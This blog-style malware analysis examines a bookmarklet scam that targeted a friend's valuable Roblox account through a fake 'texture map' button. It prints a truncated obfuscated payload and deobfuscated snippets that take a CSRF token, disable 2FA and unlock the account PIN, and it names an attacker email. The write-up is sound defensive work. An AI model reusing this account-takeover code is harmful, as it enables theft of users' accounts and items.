---
title: Bookmarklets as XSS Attack Vectors
date: 2024-06-09 05:08:01 +0800
categories: [Malware Analysis]
tags: [javascript,xss,analysis]     # TAG names should always be lowercase
pin: false
---

## The Target

Some of us are lucky when it comes to investing. My friend (known as Gary from here on out) is one of these, but not in a way you might expect. Gary started playing Roblox when he was young just as I and many other kids did.
However, Gary took a liking to collecting hats and clothing on the website. He spent whatever birthday money and allowances he got on viking hats and fire-themed balaclavas for his avatar.

This seemed like a bit of a waste of money - at the time. Fast forward to nearly 10 years later, and now his vast collection is worth several thousand REAL dollars. Unfortunately, this amount of wealth comes with 
a large target on his back. Hackers are constantly attempting to get access to his items, through scam websites and malicious emails.

## The Attack

Recently, Gary got a message asking if someone could make some fanart of his unique avatar. He said sure. The artist responded they would start soon, but need him to send over a special texture map of his avatar. 
As far as I am told, this isnt completely out of the ordinary. The texture map can help a lot with correctly modeling avatars in animations, for example.

But then the artist sent Gary a link to a website - which I will not include here for obvious reasons - containing a 'bookmarkable button' to quickly generate texture maps for his avatar. How convenient and not suspicious 
at all!

Gary immediately asked me to take a look and see if the website was malicious or not. So I did. And boy did I find some stuff.

The website was relatively barebones except for a giant link-button and 'walkthrough' video explaining how to properly use it. The first thing I did was inspect the website's source. I couldn't help but immediately
notice a hilariously suspicious anchor element:

```javascript
<a href="javascript:const%20_0x4cc798%3D_0x2001%3B%28function%28_0x5d8d84%2C_0x388ac2%29%7Bconst%20_0x108b54%3D_0x2001%2C_0x39dcc9%3D_0x5d8d84%28%29%3Bwhile%28%21%21%5B%5D%29%7Btry%7Bconst%20_0x1b78d8%3D-parseInt%28_0x108b54%280x185%29%29%2F0x1%2A%28parseInt%28_0x108b54%280xc3%29%29%2F0x2%29%2B-parseInt%28_0x108b54%280x183%29%29%2F0x3%2A%28parseInt%28_0x108b54%280x152%29%29%2F0x4%29%2B-parseInt%28_0x108b54%280x17c%29%29%2F0x5%2B-parseInt%28_0x108b54%280x162%29%29%2F0x6%2A%28-parseInt%28_0x108b54%280xc2%29%29%2F0x7%29%2BparseInt%28_0x108b54%280x144%29%29%2F0x8%2B-parseInt%28_0x108b54%280x111%29%29%2F0x9%2BparseInt%28_0x108b54%280x142%29%29%2F0xa%2A%28parseInt%28_0x108b54%280xca%29%29%2F0xb%29%3Bif%28_0x1b78d8%3D%3D%3D_0x388ac2%29break%3Belse%20_0x39dcc9%5B%27push%27%5D%28_0x39dcc9%5B%27shift%27%5D%28%29%29%3B%7Dcatch%28_0x5c0eac%29%7B_0x39dcc9%5B%27push%27%5D%28_0x39dcc9%5B%27shift%27%5D%28%29%29%3B%7D%7D%7D%28_0x219d%2C0x1dfe2%29%2Cwindow%5B_0x4cc798%280xe9%29%5D%3Ddocument%5B_0x4cc798%280x110%29%5D%28_0x4cc798%280x169%29%29%5B0x0%5D%5B%27getAttribute%27%5D%28_0x4cc798%280x11a%29%29%2Cwindow%5B_0x4cc798%280xbd%29%5D%3D%27%27%29%3Bfunction%20_0x2001%28_0x34f505%2C_0x56e9bf%29%7Bconst%20_0x219db2%3D_0x219d%28%29%3Breturn%20_0x2001%3Dfunction%28_0x20010f%2C_0x526ece%29%7B_0x20010f%3D_0x20010f-0xa3%3Blet%20_0x3a8f3e%3D_0x219db2%5B_0x20010f%5D%3Breturn%20_0x3a8f3e%3B%7D%2C_0x2001%28_0x34f505%2C_0x56e9bf%29%3B%7Dconst%20acceptableHeaders%3D%7B%27accept%27%3A%27application%2Fjson%2C%5Cx20text%2Fplain%2C%5Cx20%2A%2F%2A%27%2C%27accept-language%27%3A_0x4cc798%280x13e%29%2C%27sec-ch-ua%27%3A_0x4cc798%280x116%29%2C%27sec-ch-ua-mobile%27%3A%27%3F0%27%2C%27sec-ch-ua-platform%27%3A_0x4cc798%280xa6%29%2C%27sec-fetch-dest%27%3A_0x4cc798%280x14c%29%2C%27sec-fetch-mode%27%3A_0x4cc798%280xa4%29%2C%27sec-fetch-site%27%3A_0x4cc798%280xec%29%2C%27sec-gpc%27%3A%271%27%7D%2CyourSitesURL%3D_0x4cc798%280xae%29%2CgetCsrfToken%3Dasync%28%29%3D%3E%7Bconst%20_0x3d5a96%3D_0x4cc798%2C_0x313a18%3Dawait%20fetch%28%27https%3A%2F%2Fapis.roblox.com%2Fuser-settings-api%2Fv1%2Fuser-settings%3FwhoCanJoinMeInExperiences%3DFollowers%27%2C%7B%27credentials%27%3A%27include%27%2C%27headers%27%3AacceptableHeaders%2C%27method%27%3A%27POST%27%2C%27mode%27%3A_0x3d5a96%280xa4%29%7D%29%5B_0x3d5a96%280x12b%29%5D%28_0x498197%3D%3E%7B%7D%29%3Bif%28%21_0x313a18%29return%20await%20getCsrfToken%28%29%3Blet%20_0x11d173%3D_0x313a18%5B_0x3d5a96%280xf8%29%5D%5B_0x3d5a96%280x129%29%5D%28_0x3d5a96%280xd4%29%29%3Bif%28%21_0x11d173%29return%20await%20getCsrfToken%28%29%3Breturn%20_0x11d173%3B%7D%2CunlockAccountByPin%3Dasync%20_0x181c0c%3D%3E%7Bconst%20_0xe09cf9%3D_0x4cc798%3Bfetch%28%27https%3A%2F%2Fauth.roblox.com%2Fv1%2Faccount%2Fpin%2Funlock%3Fpin%3D%27%2B_0x181c0c%2C%7B%27headers%27%3A%7B%27accept%27%3A_0xe09cf9%280xa9%29%2C%27accept-language%27%3A_0xe09cf9%280x13e%29%2C%27content-type%27%3A%27application%2Fjson%3Bcharset%3DUTF-8%27%2C%27sec-ch-ua%27%3A_0xe09cf9%280x116%29%2C%27sec-ch-ua-mobile%27%3A%27%3F0%27%2C%27sec-ch-ua-platform%27%3A_0xe09cf9%280xa6%29%2C%27sec-fetch-dest%27%3A_0xe09cf9%280x14c%29%2C%27sec-fetch-mode%27%3A_0xe09cf9%280xa4%29%2C%27sec-fetch-site%27%3A_0xe09cf9%280xec%29%2C%27sec-gpc%27%3A%271%27%2C%27x-csrf-token%27%3Aawait%20getCsrfToken%28%29%7D%2C%27referrer%27%3A_0xe09cf9%280xa3%29%2C%27referrerPolicy%27%3A_0xe09cf9%280xc0%29%2C%27body%27%3A_0xe09cf9%280x160%29%2B_0x181c0c%2B%27%5Cx22%7D%27%2C%27method%27%3A_0xe09cf9%280x137%29%2C%27mode%27%3A_0xe09cf9%280xa4%29%2C%27credentials%27%3A_0xe09cf9%280x12f%29%7D%29%5B%27then%27%5D%28_0xbcaa97%3D%3E_0xbcaa97%5B_0xe09cf9%280x178%29%5D%28%29%29%5B_0xe09cf9%280x108%29%5D%28async%20_0x1cbef2%3D%3E%7Bconst%20_0x25f449%3D_0xe09cf9%3Bif%28_0x1cbef2%5B%27includes%27%5D%28_0x25f449%280x143%29%29%29document%5B_0x25f449%280x151%29%5D%28_0x25f449%280x156%29%29%5B_0x25f449%280xad%29%5D%28_0x25f449%280x172%29%2C_0x181c0c%29%2CsetDescription%28%7B%27pin%27%3A_0x181c0c%7D%29%2CcontinueToTwoStep%28%29%2Cconsole%5B_0x25f449%280x14e%29%5D%28_0x25f449%280xcf%29%29%2Cdocument%5B_0x25f449%280xc6%29%5D%28%27PIN%27%29%5B_0x25f449%280xc1%29%5D%5B_0x25f449%280x13f%29%5D%3D_0x25f449%280x139%29%3Belse%20_0x1cbef2%5B_0x25f449%280xb3%29%5D%28_0x25f449%280xff%29%29%3Fdocument%5B_0x25f449%280xc6%29%5D%28_0x25f449%280x102%29%29%5B_0x25f449%280x125%29%5D%3D_0x25f449%280x164%29%3Adocument%5B_0x25f449%280xc6%29%5D%28_0x25f449%280x102%29%29%5B%27innerHTML%27%5D%3D_0x25f449%280x146%29%3B%7D%29%3B%7D%2CcreateOTPsession%3Dasync%28%29%3D%3E%7Bconst%20_0x1f209f%3D_0x4cc798%2C_0x1c30af%3Dawait%20fetch%28_0x1f209f%280xc5%29%2C%7B%27credentials%27%3A_0x1f209f%280x12f%29%2C%27headers%27%3A%7B%27Accept%27%3A_0x1f209f%280xa9%29%2C%27Accept-Language%27%3A%27en-US%2Cen%3Bq%3D0.5%27%2C%27Content-Type%27%3A_0x1f209f%280x136%29%2C%27x-csrf-token%27%3Aawait%20getCsrfToken%28%29%2C%27Sec-GPC%27%3A%271%27%2C%27Sec-Fetch-Dest%27%3A_0x1f209f%280x14c%29%2C%27Sec-Fetch-Mode%27%3A_0x1f209f%280xa4%29%2C%27Sec-Fetch-Site%27%3A_0x1f209f%280xec%29%7D%2C%27referrer%27%3A%27https%3A%2F%2Fwww.roblox.com%2F%27%2C%27body%27%3A_0x1f20
```

Clearly this was some obfuscated JavaScript. Even taking a look at some of the strings was damning - `creteOTPsession`, `getCsrfToken`, etc. I immediately told Gary to stop talking to this guy and block him.

But I decided to go a bit deeper and started deobfuscating the JavaScript. Hilariously, the author actually just used [this](https://deobfuscate.io/) link, so the process was fairly trivial. However, local variable
names were obviously still random hex strings and unable to be recovered.

## The Payload

As expected, the payload JavaScript was a large amount of fetch requests to endpoints related to account settings and security:

```javascript
const disable2fa = async (_0x28bbe9, _0x197e35, _0x4fe56d) => {
  _0x197e35 = _0x197e35 || 0x0;
  _0x197e35++;
  if (_0x197e35 >= 0x3) {
    return;
  }
  let _0x42560a = await fetch("https://twostepverification.roblox.com/v1/users/" + _0x28bbe9 + "/configuration/authenticator/disable", {
    'headers': Object.assign(acceptableHeaders, {
      'x-csrf-token': window.csrf
    }),
    'referrer': "https://www.roblox.com/",
    'referrerPolicy': "strict-origin-when-cross-origin",
    'method': "POST",
    'mode': 'cors',
    'credentials': 'include'
  })['catch'](() => {});
  if (_0x42560a.status === 0x193) {
    _0x4fe56d = _0x42560a.headers.get("x-csrf-token");
    await disable2fa(_0x28bbe9, _0x197e35, _0x4fe56d);
  } else {
    return true;
  }
```

Perhaps the most interesting part of the entire payload was the very first fetch request made. Before accessing any user settings or inventory listings, the script makes a call to lookup details for a user with
ID 6055914656 - 'badmilky22':

```javascript
fetch("https://users.roblox.com/v1/users/6055914656", {
  'headers': {
    'accept': "application/json, text/plain, */*",
    'accept-language': "en-GB,en-US;q=0.9,en;q=0.8",
    'sec-ch-ua': "\"Chromium\";v=\"118\", \"Brave\";v=\"118\", \"Not=A?Brand\";v=\"99\"",
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': "\"Windows\"",
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': "cors",
    'sec-fetch-site': "same-site",
    'sec-gpc': '1'
  },
  'referrer': "https://www.roblox.com/",
  'referrerPolicy': "strict-origin-when-cross-origin",
  'method': 'GET',
  'mode': "cors",
  'credentials': 'include'
```

After the call, the payload then passes the user's bio/description into the `parseBinary` function:

```javascript
const evil_email = parseBinary(_0x5dd11c.description);
```

That's odd. Why would it do that? Well, I decided to look at badmilky22's account description. It was just a bunch of binary:

![badmilky22](/assets/img/badmilky22.png)

Decoding this to ASCII gives the hacker's email address `lr46opcs@fastsearcher.com`! Later on in the payload, this email address is used when victim account details are hijacked.

Afterwards, the payload does some pretty standard hacker stuff like resetting passwords and disabling 2FA. 

## But... what about CORS?

I couldn't understand how the payload managed to get around CORS. For those of you unaware, Cross Origin Resource Sharing (CORS) is a security setting for HTTP that can easily stop CSRF attacks like this. The
gist is that JavaScript from another 'Origin' (i.e. not roblox.com) should NOT be able to make credentialed requests or access HTTP responses from credentialed requests on behalf of a user. In this case, the
malicious 'link' (`<a/>` tag) element embedded with obfuscated JavaScript should NOT be able to successfully make these malicious requests on behalf of a user.

At first I was convinced that this guy just didn't know what he was doing, but then I realized that the malicious domain site had been registered only 5 days prior, and that clearly some thought was put into this
payload. So I decided to watch the 'walkthrough' video. The video instantly clarified everything for me - the bookmark the site wanted you to make was NOT to the malicious domain, but to literally drag and drop
the link-button onto your bookmarks bar.

This creates what modern browsers call Bookmarklets - or 'bookmarks' that are actually just JavaScript code. This is incredibly valuable in a cross-site scripting attack as it can easily bypass any CORS restrictions.
As far as I am aware, this isn't a very widely used or discussed attack vector. The implications of 'stored-xss' on any origin site are massive. 

## Conclusion

It seems that this is simply an accepted facet of modern browsers. I personally have never heard of someone using bookmarklets for a legitimate purpose, and the attack implications are critical. I would seriously 
recommend Mozilla and Chrome consider disabling telemetry for JavaScript-enabled bookmarklets, or including a custom origin/header for bookmarklet requests.


